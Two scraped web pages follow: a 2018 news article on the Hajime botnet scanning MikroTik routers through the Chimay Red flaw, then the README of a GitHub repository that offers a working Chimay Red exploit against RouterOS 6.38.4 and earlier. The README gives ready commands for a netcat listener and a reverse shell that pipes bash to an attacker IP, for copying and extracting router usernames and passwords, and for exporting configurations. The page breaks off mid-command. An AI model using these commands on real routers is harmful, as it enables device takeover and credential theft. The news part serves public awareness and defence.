=== Content from www.bleepingcomputer.com_5b956b4f_20250125_053425.html ===


[![BleepingComputer.com logo](https://www.bleepstatic.com/images/site/logo.png)](https://www.bleepingcomputer.com/)

* [News](https://www.bleepingcomputer.com/)
  + [Featured](#nfeatured)
  + [Latest](#nlatest)
  + [![Windows 11 24H2 now also offered to all eligible Windows 10 PCs](data:image/gif;base64...)

    Windows 11 24H2 now also offered to all eligible Windows 10 PCs](https://www.bleepingcomputer.com/news/microsoft/microsoft-expands-windows-11-24h2-rollout-to-eligible-windows-10-pcs/)
  + [![Hundreds of fake Reddit sites push Lumma Stealer malware](data:image/gif;base64...)

    Hundreds of fake Reddit sites push Lumma Stealer malware](https://www.bleepingcomputer.com/news/security/hundreds-of-fake-reddit-sites-push-lumma-stealer-malware/)
  + [![Stealthy 'Magic Packet' malware targets Juniper VPN gateways](data:image/gif;base64...)

    Stealthy 'Magic Packet' malware targets Juniper VPN gateways](https://www.bleepingcomputer.com/news/security/stealthy-magic-packet-malware-targets-juniper-vpn-gateways/)
  + [![SonicWall warns of SMA1000 RCE flaw exploited in zero-day attacks](data:image/gif;base64...)

    SonicWall warns of SMA1000 RCE flaw exploited in zero-day attacks](https://www.bleepingcomputer.com/news/security/sonicwall-warns-of-sma1000-rce-flaw-exploited-in-zero-day-attacks/)
  + [![Zyxel warns of bad signature update causing firewall boot loops](data:image/gif;base64...)

    Zyxel warns of bad signature update causing firewall boot loops](https://www.bleepingcomputer.com/news/security/zyxel-warns-of-bad-signature-update-causing-firewall-boot-loops/)
  + [![Microsoft to deprecate WSUS driver synchronization in 90 days](data:image/gif;base64...)

    Microsoft to deprecate WSUS driver synchronization in 90 days](https://www.bleepingcomputer.com/news/microsoft/microsoft-to-deprecate-wsus-driver-synchronization-in-90-days/)
  + [![Subaru Starlink flaw let hackers hijack cars in US and Canada](data:image/gif;base64...)

    Subaru Starlink flaw let hackers hijack cars in US and Canada](https://www.bleepingcomputer.com/news/security/subaru-starlink-flaw-let-hackers-hijack-cars-in-us-and-canada/)
  + [![Hackers use Windows RID hijacking to create hidden admin account](data:image/gif;base64...)

    Hackers use Windows RID hijacking to create hidden admin account](https://www.bleepingcomputer.com/news/security/hackers-use-windows-rid-hijacking-to-create-hidden-admin-account/)
* [Tutorials](https://www.bleepingcomputer.com/tutorials/)
  + [Latest](#tlatest)
  + [Popular](#popular)
  + [![How to access the Dark Web using the Tor Browser](data:image/gif;base64...)

    How to access the Dark Web using the Tor Browser](/tutorials/how-to-access-the-dark-web-using-the-tor-browser/)
  + [![How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11](data:image/gif;base64...)

    How to enable Kernel-mode Hardware-enforced Stack Protection in Windows 11](/tutorials/how-to-enable-kernel-mode-hardware-enforced-stack-protection-in-windows-11/)
  + [![How to use the Windows Registry Editor](data:image/gif;base64...)

    How to use the Windows Registry Editor](/tutorials/how-to-use-the-windows-registry-editor/)
  + [![How to backup and restore the Windows Registry](data:image/gif;base64...)

    How to backup and restore the Windows Registry](/tutorials/how-to-backup-and-restore-the-windows-registry/)
  + [![How to start Windows in Safe Mode](data:image/gif;base64...)

    How to start Windows in Safe Mode](/tutorials/how-to-start-windows-in-safe-mode/)
  + [![How to remove a Trojan, Virus, Worm, or other Malware](data:image/gif;base64...)

    How to remove a Trojan, Virus, Worm, or other Malware](/tutorials/how-to-remove-a-trojan-virus-worm-or-malware/)
  + [![How to show hidden files in Windows 7](data:image/gif;base64...)

    How to show hidden files in Windows 7](/tutorials/show-hidden-files-in-windows-7/)
  + [![How to see hidden files in Windows](data:image/gif;base64...)

    How to see hidden files in Windows](/tutorials/how-to-see-hidden-files-in-windows/)
* [Virus Removal Guides](https://www.bleepingcomputer.com/virus-removal/)
  + [Latest](#vlatest)
  + [Most Viewed](#vmost)
  + [Ransomware](#ransomware)
  + [![Remove the Theonlinesearch.com Search Redirect](data:image/gif;base64...)

    Remove the Theonlinesearch.com Search Redirect](/virus-removal/remove-theonlinesearch.com-search-redirect)
  + [![Remove the Smartwebfinder.com Search Redirect](data:image/gif;base64...)

    Remove the Smartwebfinder.com Search Redirect](/virus-removal/remove-smartwebfinder.com-search-redirect)
  + [![How to remove the PBlock+ adware browser extension](data:image/gif;base64...)

    How to remove the PBlock+ adware browser extension](/virus-removal/how-to-remove-the-pblock-adware-extension)
  + [![Remove the Toksearches.xyz Search Redirect](data:image/gif;base64...)

    Remove the Toksearches.xyz Search Redirect](/virus-removal/remove-toksearches.xyz-search-redirect)
  + [![Remove Security Tool and SecurityTool (Uninstall Guide)](data:image/gif;base64...)

    Remove Security Tool and SecurityTool (Uninstall Guide)](/virus-removal/remove-security-tool)
  + [![How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo](data:image/gif;base64...)

    How to Remove WinFixer / Virtumonde / Msevents / Trojan.vundo](/virus-removal/remove-vundo-virtumonde)
  + [![How to remove Antivirus 2009 (Uninstall Instructions)](data:image/gif;base64...)

    How to remove Antivirus 2009 (Uninstall Instructions)](/virus-removal/uninstall-antivirus-2009)
  + [![How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller](data:image/gif;base64...)

    How to remove Google Redirects or the TDSS, TDL3, or Alureon rootkit using TDSSKiller](/virus-removal/remove-tdss-tdl3-alureon-rootkit-using-tdsskiller)
  + [![Locky Ransomware Information, Help Guide, and FAQ](data:image/gif;base64...)

    Locky Ransomware Information, Help Guide, and FAQ](/virus-removal/locky-ransomware-information-help)
  + [![CryptoLocker Ransomware Information Guide and FAQ](data:image/gif;base64...)

    CryptoLocker Ransomware Information Guide and FAQ](/virus-removal/cryptolocker-ransomware-information)
  + [![CryptorBit and HowDecrypt Information Guide and FAQ](data:image/gif;base64...)

    CryptorBit and HowDecrypt Information Guide and FAQ](/virus-removal/cryptorbit-ransomware-information)
  + [![CryptoDefense and How_Decrypt Ransomware Information Guide and FAQ](data:image/gif;base64...)

    CryptoDefense and How\_Decrypt Ransomware Information Guide and FAQ](/virus-removal/cryptodefense-ransomware-information)
* [Downloads](https://www.bleepingcomputer.com/download/)
  + [Latest](#dlatest)
  + [Most Downloaded](#most)
  + [![Qualys BrowserCheck](data:image/gif;base64...)

    Qualys BrowserCheck](https://www.bleepingcomputer.com/download/qualys-browsercheck/)
  + [![STOPDecrypter](data:image/gif;base64...)

    STOPDecrypter](https://www.bleepingcomputer.com/download/stopdecrypter/)
  + [![AuroraDecrypter](data:image/gif;base64...)

    AuroraDecrypter](https://www.bleepingcomputer.com/download/auroradecrypter/)
  + [![FilesLockerDecrypter](data:image/gif;base64...)

    FilesLockerDecrypter](https://www.bleepingcomputer.com/download/fileslockerdecrypter/)
  + [![AdwCleaner](data:image/gif;base64...)

    AdwCleaner](/download/adwcleaner/)
  + [![ComboFix](data:image/gif;base64...)

    ComboFix](/download/combofix/)
  + [![RKill](data:image/gif;base64...)

    RKill](/download/rkill/)
  + [![Junkware Removal Tool](data:image/gif;base64...)

    Junkware Removal Tool](/download/junkware-removal-tool/)
* [Deals](https://deals.bleepingcomputer.com/)
  + [Categories](#dcategories)
  + [![eLearning](data:image/gif;base64...)

    eLearning](https://deals.bleepingcomputer.com/deals/elearning?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![IT Certification Courses](data:image/gif;base64...)

    IT Certification Courses](https://deals.bleepingcomputer.com/deals/certifications?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![Gear & Gadgets](data:image/gif;base64...)

    Gear + Gadgets](https://deals.bleepingcomputer.com/deals/gear-gadgets?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
  + [![Security](data:image/gif;base64...)

    Security](https://deals.bleepingcomputer.com/collections/tag-cyber-security?utm_source=bleepingcomputer.com&utm_medium=dd_cat)
* [VPNs](https://www.bleepingcomputer.com/vpn/)
  + [Popular](#vpopular)
  + [![Best VPNs](data:image/gif;base64...)

    Best VPNs](https://www.bleepingcomputer.com/vpn/guides/best-vpn/)
  + [![How to change IP address](data:image/gif;base64...)

    How to change IP address](https://www.bleepingcomputer.com/vpn/guides/change-ip-address/)
  + [![Access the dark web safely](data:image/gif;base64...)

    Access the dark web safely](https://www.bleepingcomputer.com/vpn/guides/access-dark-web-safely/)
  + [![Best VPN for YouTube](data:image/gif;base64...)

    Best VPN for YouTube](https://www.bleepingcomputer.com/vpn/guides/watch-youtube-tv-abroad-vpn/)
* [Forums](https://www.bleepingcomputer.com/forums/)
* More
  + [Startup Database](https://www.bleepingcomputer.com/startups/)
  + [Uninstall Database](https://www.bleepingcomputer.com/uninstall/)
  + [Glossary](https://www.bleepingcomputer.com/glossary/)
  + [Chat on Discord](https://www.bleepingcomputer.com/forums/t/730914/the-bleepingcomputer-official-discord-chat-server-come-join-the-fun/)
  + [Send us a Tip!](https://www.bleepingcomputer.com/news-tip/)
  + [Welcome Guide](https://www.bleepingcomputer.com/welcome-guide/)

* [Home](https://www.bleepingcomputer.com/)
* [News](https://www.bleepingcomputer.com/news/)
* [Security](https://www.bleepingcomputer.com/news/security/)
* Hajime Botnet Makes a Comeback With Massive Scan for MikroTik Routers

# Hajime Botnet Makes a Comeback With Massive Scan for MikroTik Routers

By
###### [Catalin Cimpanu](https://www.bleepingcomputer.com/author/catalin-cimpanu/)

* March 28, 2018
* 05:02 AM
* [0](#comment_form)

![Hajime botnet](https://www.bleepstatic.com/content/hl-images/2017/04/19/hajime.jpg)

If you've been following the infosec Twitter community for the last few days, you couldn't ignore the constant talk about the massive scans currently taking place online, carried out by a Hajime IoT botnet looking to mass-infect unpatched MikroTik devices.

All of the hoopla started on Sunday, March 25, when suspicious scans for port 8291 popped up out of the blue on everyone's honeypots.

> The new Hajime variant has been scanning wide range of tcp ports since 2018-03-26. Now it scans 80, 81, 82, 8080, 8081, 8082, 8089, 8181, 8291 and 8880. We observe these scanning activities at out honeypots.[@360Netlab](https://twitter.com/360Netlab?ref_src=twsrc%5Etfw) [@chudyPB](https://twitter.com/chudyPB?ref_src=twsrc%5Etfw)
>
> — Masafumi Negishi (@MasafumiNegishi) [March 27, 2018](https://twitter.com/MasafumiNegishi/status/978540197817106432?ref_src=twsrc%5Etfw)

> So the old Hajime botnet is coming back with a new exploit which was published only about 13 days ago ( <https://t.co/UEAOTF4DiZ> ), it also looks for some old exploits like tr-064 but nothing exciting there. <https://t.co/vyIDU7CXpn>
>
> — 360 Netlab (@360Netlab) [March 25, 2018](https://twitter.com/360Netlab/status/977932206835462146?ref_src=twsrc%5Etfw)

The scans only continued in the following days, showing no sign of abating, and attracting attention from security researchers from all over the globe.

The attention was warranted as the scans weren't something small, and continued at an intensive rate. The first to spot the scans were researchers from Qihoo 360's Netlab team, who said today this Hajime botnet performed over 860,000 scans in the last three days, albeit they couldn't tell how many of these scans were also successful infections.

## Attackers use Chimay Red exploit against MikroTik devices

The exploit attackers were trying to use was a vulnerability known as "Chimay Red," a bug that affects MikroTik RouterOS firmware 6.38.4 and earlier, and allows attackers to execute code and take over the device.

This is the same flaw that was [included](https://wikileaks.org/ciav7p1/cms/page_16384608.html) in the WikiLeaks "Vault 7" leak of alleged CIA hacking tools, and the same flaw that some jokesters used during the past year to [deface MikroTik routers](https://www.bleepingcomputer.com/news/security/tens-of-thousands-of-defaced-mikrotik-and-ubiquiti-routers-available-online/) by changing hostnames of vulnerable devices to all sorts of expressions that included the word "hacked."

But this time around, attackers didn't joke around and they installed the Hajime bot, a strain of IoT malware known primarily for building giant botnets, with the [last one reaching over 300,000 devices](https://www.bleepingcomputer.com/news/security/security-experts-worry-as-hajime-botnet-grows-to-300-000-bots/) in the spring of 2017.

## MikroTik firmware patch available for almost a year

These massive scans didn't go unnoticed on MikroTik's side either. Users [reported](https://forum.mikrotik.com/viewtopic.php?f=2&t=132368&p=650352#p650340) the scans on MikroTik's forums, and the company's engineers looked into the attacks.

"It has come to our attention that a mass scan for open ports 80/8291(Web/Winbox) is taking place," said MikroTik on Twitter. "To be safe, firewall these ports and upgrade RouterOS devices to v6.41.3 (or at least, above v6.38.5).

> It has come to our attention that a a mass scan for open ports 80/8291(Web/Winbox) is taking place. To be safe, firewall these ports and upgrade RouterOS devices to v6.41.3 (or at least, above v6.38.5)
>
> — MikroTik (@mikrotik\_com) [March 27, 2018](https://twitter.com/mikrotik_com/status/978533853324283904?ref_src=twsrc%5Etfw)

As MikroTik points out, the Chimay Red vulnerability was fixed last year, when the company's engineers released RouterOS firmware version 6.38.5.

## Bot has simple scan & infect mechanism

As for the Hajime bot's infection attempts, this follows a quite simplistic pattern. Other Hajime infected bots scan random IP addresses on port 8291. This initial scan is to determine if the remote IP is running a MikroTik device.

Once the bot has identified one of such devices, it then tries to infect the device with a [public exploit](https://www.exploit-db.com/exploits/44284/) package sent via one of the following ports: 80, 81, 82, 8080, 8081, 8082, 8089, 8181, and 8880.

Once a new device has been infected with a Hajime bot, this new device also starts scanning to infect other MikroTik routers.

![Hajime scan and infection process](https://www.bleepstatic.com/images/news/u/986406/Malware/IoT/Hajime_spread_with_8291.png)

It is worth mentioning that in the past, the Hajime IoT botnet was never used for massive DDoS attacks, and its existance was a mystery for many researchers, as the botnet only gathered infected devices but almost never did anything with them (except scan for other vulnerable devices).

IOCs and technical write-ups about this new bot are also available, authored by the research teams from [Netlab](https://blog.netlab.360.com/quick-summary-port-8291-scan-en/) and [Radware](https://security.radware.com/ddos-threats-attacks/threat-advisories-attack-reports/mikrotik-botnet/).

### Related Articles:

[Malware botnets exploit outdated D-Link routers in recent attacks](https://www.bleepingcomputer.com/news/security/malware-botnets-exploit-outdated-d-link-routers-in-recent-attacks/)

[Juniper warns of Mirai botnet scanning for Session Smart routers](https://www.bleepingcomputer.com/news/security/juniper-warns-of-mirai-botnet-scanning-for-session-smart-routers/)

[New IOCONTROL malware used in critical infrastructure attacks](https://www.bleepingcomputer.com/news/security/new-iocontrol-malware-used-in-critical-infrastructure-attacks/)

[Hacker infects 18,000 "script kiddies" with fake malware builder](https://www.bleepingcomputer.com/news/security/hacker-infects-18-000-script-kiddies-with-fake-malware-builder/)

[Hundreds of fake Reddit sites push Lumma Stealer malware](https://www.bleepingcomputer.com/news/security/hundreds-of-fake-reddit-sites-push-lumma-stealer-malware/)

* [Hajime](https://www.bleepingcomputer.com/tag/hajime/)
* [IoT](https://www.bleepingcomputer.com/tag/iot/)
* [Malware](https://www.bleepingcomputer.com/tag/malware/)
* [MikroTik](https://www.bleepingcomputer.com/tag/mikrotik/)
* [Router](https://www.bleepingcomputer.com/tag/router/)
* [Vault 7](https://www.bleepingcomputer.com/tag/vault-7/)

##### [Catalin Cimpanu](https://www.bleepingcomputer.com/author/catalin-cimpanu/)

Catalin Cimpanu is the Security News Editor for Bleeping Computer, where he covers topics such as malware, breaches, vulnerabilities, exploits, hacking news, the Dark Web, and a few more. Catalin previously covered Web & Security news for Softpedia between May 2015 and October 2016. The easiest way to reach Catalin is via his XMPP/Jabber address at campuscodi@xmpp.is. For other contact methods, please visit Catalin's author page.

* [Previous Article](https://www.bleepingcomputer.com/news/security/facebook-wants-security-researchers-to-hunt-down-apps-that-misuse-user-data/)
* [Next Article](https://www.bleepingcomputer.com/news/microsoft/microsoft-releases-tool-for-running-any-linux-os-on-windows-10/)

##### Post a Comment [Community Rules](https://www.bleepingcomputer.com/posting-guidelines/)

###### You need to login in order to post a comment

Not a member yet? [Register Now](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global§ion=register)

### You may also like:

[![ThreatLocker Zero Trust World](https://www.bleepstatic.com/c/t/threatlocker/ThreatLocker_ZTW-2025-400-500.png)](https://ztw.com/?utm_souce=bleepingcomputer)

Popular Stories

* [![Windows 11](data:image/gif;base64...)

  Windows 11 24H2 now also offered to all eligible Windows 10 PCs](https://www.bleepingcomputer.com/news/microsoft/microsoft-expands-windows-11-24h2-rollout-to-eligible-windows-10-pcs/)
* [![School Hacker](data:image/gif;base64...)

  PowerSchool hacker claims they stole data of 62 million students](https://www.bleepingcomputer.com/news/security/powerschool-hacker-claims-they-stole-data-of-62-million-students/)
* [![Pwn2Own Tokyo](data:image/gif;base64...)

  Hackers exploit 16 zero-days on first day of Pwn2Own Automotive 2025](https://www.bleepingcomputer.com/news/security/hackers-exploit-16-zero-days-on-first-day-of-pwn2own-automotive-2025/)

Sponsor Posts

* [![Struggling with Security? Learn how VisionX + Splunk has you covered]()

  Struggling with Security? Learn how VisionX + Splunk has you covered](https://www.smarttech247.com/mdr-solutions/mdr-for-splunk-with-visionx/)
* [![Criminal IP: Real-Time Phishing Protection for Outlook Users]()

  Criminal IP: Real-Time Phishing Protection for Outlook Users](https://appsource.microsoft.com/en-us/product/office/WA200007637?tab=Overview)
* [![Generative AI: An MFA Game Changer for Security and Hacker Strategy]()

  Generative AI: An MFA Game Changer for Security and Hacker Strategy](https://www.tokenring.com/generative-ai-ebook-lp?utm_campaign=6461243-Cmp%20-%20BleepingComp%20-%20MFA%20Failures&utm_source=Bleeping-Computer&utm_medium=Sidebar)
* [![Password health-check overdue? Audit your Active Directory for free]()

  Password health-check overdue? Audit your Active Directory for free](https://specopssoft.com/product/specops-password-auditor/?utm_source=bleepingcomputer&utm_medium=referral&utm_campaign=na_bleepingcomputer&utm_content=article)
* [![Criminal IP Teams Up with OnTheHub for Digital Education Cybersecurity]()

  Criminal IP Teams Up with OnTheHub for Digital Education Cybersecurity](https://onthehub.com/shop?search=criminal%20ip)

##### Follow us:

##### Main Sections

* [News](https://www.bleepingcomputer.com/)
* [VPN Buyer Guides](https://www.bleepingcomputer.com/vpn/)
* [SysAdmin Software Guides](https://www.bleepingcomputer.com/sysadmin/)
* [Downloads](https://www.bleepingcomputer.com/download/)
* [Virus Removal Guides](https://www.bleepingcomputer.com/virus-removal/)
* [Tutorials](https://www.bleepingcomputer.com/tutorials/)
* [Startup Database](https://www.bleepingcomputer.com/startups/)
* [Uninstall Database](https://www.bleepingcomputer.com/uninstall/)
* [Glossary](https://www.bleepingcomputer.com/glossary/)

##### Community

* [Forums](https://www.bleepingcomputer.com/forums/)
* [Forum Rules](https://www.bleepingcomputer.com/forum-rules/)
* [Chat](https://www.bleepingcomputer.com/forums/t/730914/the-bleepingcomputer-official-discord-chat-server-come-join-the-fun/)

##### Useful Resources

* [Welcome Guide](https://www.bleepingcomputer.com/welcome-guide/)
* [Sitemap](https://www.bleepingcomputer.com/sitemap/)

##### Company

* [About BleepingComputer](https://www.bleepingcomputer.com/about/)
* [Contact Us](https://www.bleepingcomputer.com/contact/)
* [Send us a Tip!](https://www.bleepingcomputer.com/news-tip/)
* [Advertising](https://www.bleepingcomputer.com/advertise/)
* [Write for BleepingComputer](https://www.bleepingcomputer.com/write-for-bleepingcomputer/)
* [Social & Feeds](https://www.bleepingcomputer.com/rss-feeds/)
* [Changelog](https://www.bleepingcomputer.com/changelog/)

[Terms of Use](https://www.bleepingcomputer.com/terms-of-use/) -  [Privacy Policy](https://www.bleepingcomputer.com/privacy/) - [Ethics Statement](https://www.bleepingcomputer.com/ethics-statement/) - [Affiliate Disclosure](https://www.bleepingcomputer.com/affiliate-disclosure/)

Copyright @ 2003 - 2025  [Bleeping Computer® LLC](https://www.bleepingcomputer.com/)  - All Rights Reserved

#### Login

Username

Password

Remember Me

Sign in anonymously

[![Sign in with Twitter button](https://www.bleepstatic.com/images/site/login/twitter.png) Sign in with Twitter](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global&section=login&serviceClick=twitter&return=https://www.bleepingcomputer.com/news/security/hajime-botnet-makes-a-comeback-with-massive-scan-for-mikrotik-routers/)

---

Not a member yet? [Register Now](https://www.bleepingcomputer.com/forums/index.php?app=core&module=global§ion=register "Register account")

#### Reporter

###### Help us understand the problem. What is going on with this comment?

* Spam
* Abusive or Harmful
* Inappropriate content
* Strong language
* Other

Read our [posting guidelinese](https://www.bleepingcomputer.com/posting-guidelines/) to learn what content is prohibited.

Submitting...
SUBMIT



=== Content from github.com_c9d67bae_20250125_053423.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FBigNerd95%2FChimay-Red)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FBigNerd95%2FChimay-Red)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=BigNerd95%2FChimay-Red)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[BigNerd95](/BigNerd95)
/
**[Chimay-Red](/BigNerd95/Chimay-Red)**
Public

* [Notifications](/login?return_to=%2FBigNerd95%2FChimay-Red) You must be signed in to change notification settings
* [Fork
  216](/login?return_to=%2FBigNerd95%2FChimay-Red)
* [Star
   657](/login?return_to=%2FBigNerd95%2FChimay-Red)

Working POC of Mikrotik exploit from Vault 7 CIA Leaks

[657
stars](/BigNerd95/Chimay-Red/stargazers) [216
forks](/BigNerd95/Chimay-Red/forks) [Branches](/BigNerd95/Chimay-Red/branches) [Tags](/BigNerd95/Chimay-Red/tags) [Activity](/BigNerd95/Chimay-Red/activity)
 [Star](/login?return_to=%2FBigNerd95%2FChimay-Red)

 [Notifications](/login?return_to=%2FBigNerd95%2FChimay-Red) You must be signed in to change notification settings

* [Code](/BigNerd95/Chimay-Red)
* [Issues
  23](/BigNerd95/Chimay-Red/issues)
* [Pull requests
  1](/BigNerd95/Chimay-Red/pulls)
* [Actions](/BigNerd95/Chimay-Red/actions)
* [Projects
  0](/BigNerd95/Chimay-Red/projects)
* [Security](/BigNerd95/Chimay-Red/security)
* [Insights](/BigNerd95/Chimay-Red/pulse)

Additional navigation options

* [Code](/BigNerd95/Chimay-Red)
* [Issues](/BigNerd95/Chimay-Red/issues)
* [Pull requests](/BigNerd95/Chimay-Red/pulls)
* [Actions](/BigNerd95/Chimay-Red/actions)
* [Projects](/BigNerd95/Chimay-Red/projects)
* [Security](/BigNerd95/Chimay-Red/security)
* [Insights](/BigNerd95/Chimay-Red/pulse)

# BigNerd95/Chimay-Red

    master[Branches](/BigNerd95/Chimay-Red/branches)[Tags](/BigNerd95/Chimay-Red/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[83 Commits](/BigNerd95/Chimay-Red/commits/master/) | | |
| [POCs](/BigNerd95/Chimay-Red/tree/master/POCs "POCs") | | [POCs](/BigNerd95/Chimay-Red/tree/master/POCs "POCs") |  |  |
| [docs](/BigNerd95/Chimay-Red/tree/master/docs "docs") | | [docs](/BigNerd95/Chimay-Red/tree/master/docs "docs") |  |  |
| [tools](/BigNerd95/Chimay-Red/tree/master/tools "tools") | | [tools](/BigNerd95/Chimay-Red/tree/master/tools "tools") |  |  |
| [README.md](/BigNerd95/Chimay-Red/blob/master/README.md "README.md") | | [README.md](/BigNerd95/Chimay-Red/blob/master/README.md "README.md") |  |  |
| [StackClash\_mips.py](/BigNerd95/Chimay-Red/blob/master/StackClash_mips.py "StackClash_mips.py") | | [StackClash\_mips.py](/BigNerd95/Chimay-Red/blob/master/StackClash_mips.py "StackClash_mips.py") |  |  |
| [StackClash\_resock\_mips.py](/BigNerd95/Chimay-Red/blob/master/StackClash_resock_mips.py "StackClash_resock_mips.py") | | [StackClash\_resock\_mips.py](/BigNerd95/Chimay-Red/blob/master/StackClash_resock_mips.py "StackClash_resock_mips.py") |  |  |
| [StackClash\_x86.py](/BigNerd95/Chimay-Red/blob/master/StackClash_x86.py "StackClash_x86.py") | | [StackClash\_x86.py](/BigNerd95/Chimay-Red/blob/master/StackClash_x86.py "StackClash_x86.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# Chimay-Red

Reverse engineering of Mikrotik exploit from Vault 7 CIA Leaks

See the [PDF](/BigNerd95/Chimay-Red/blob/master/docs/ChimayRed.pdf) for more info (not updated)

# Vulnerable versions

Until RouterOS 6.38.4

What's new in 6.38.5 (2017-Mar-09 11:32):

!) www - fixed http server vulnerability;

# Proof of concepts

## CrashPOC

Simple crash sending -1 as content-length in post header

## StackClashPOC

Stack clash exploit using two threads, missing ROP chain

# Working exploits

As the ROP is dynamically created, you have to extract the `www` binary from the RouterOS firmware.

(It's placed in `/nova/bin/`)

Check that the running version is the same.

To simplify extraction you can use:

```
$ ./tools/getROSbin.py 6.38.4 x86 /nova/bin/www www_binary

```

## StackClash\_x86

Stack clash exploit using two threads with ROP chain to run bash commands

### Reverse shell:

In a shell:

```
$ nc -l -p 1234

```

In another shell:

```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "/bin/mknod /ram/f p; /bin/telnet 192.168.8.5 1234 < /ram/f | /bin/bash > /ram/f 2>&1"

```

Where:

* RouterOS IP: 192.168.8.1
* PC IP: 192.168.8.5

### Extract users and passwords

```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "cp /rw/store/user.dat /ram/winbox.idx"
$ sleep 3 # (wait some seconds that www is restarted)
$ curl -s http://192.168.8.1/winbox/index | ./tools/extract_user.py -

```

### Export configs

You can execute command in Mikrotik console with `/nova/bin/info`.

Eg: `/nova/bin/info "/system reboot"` will reboot the system.

```
$ ./StackClash_x86.py 192.168.8.1 80 www_binary "/nova/bin/info '/export' > /ram/winbox.idx"
$ sleep 20 # (it's a bit slow to execute /export command)
$ curl -s http://192.168.8.1/winbox/index

```

## StackClash\_mips

Stack clash exploit using two threads with ROP chain + shell code to run bash commands

On mips version of www the stack is RWX, so we can jump to the stack.

You can run the same bash command as the x86 version.

### LCD

Funny command

```
$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "echo hello world > /dev/lcd"

```

[![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/screen_image.jpg)

### Super Mario sound

Do not do it! ;-P

```
$ ./StackClash_mips.py 192.168.8.1 80 www_binary "while [ true ]; do /nova/bin/info ':beep frequency=660 length=100ms;:delay 150ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=510 length=100ms;:delay 100ms;:beep frequency=660 length=100ms;:delay 300ms;:beep frequency=770 length=100ms;:delay 550ms;:beep frequency=380 length=100ms;:delay 575ms;:beep frequency=510 length=100ms;:delay 450ms;:beep frequency=380 length=100ms;:delay 400ms;:beep frequency=320 length=100ms;:delay 500ms;:beep frequency=440 length=100ms;:delay 300ms;:beep frequency=480 length=80ms;:delay 330ms;:beep frequency=450 length=100ms;:delay 150ms;:beep frequency=430 length=100ms;:delay 300ms;:beep frequency=380 length=100ms;:delay 200ms;:beep frequency=660 length=80ms;:delay 200ms;:beep frequency=760 length=50ms;:delay 150ms;:beep frequency=860 length=100ms;:delay 300ms;:beep frequency=700 length=80ms;:delay 150ms;:beep frequency=760 length=50ms;:delay 350ms;:beep frequency=660 length=80ms;:delay 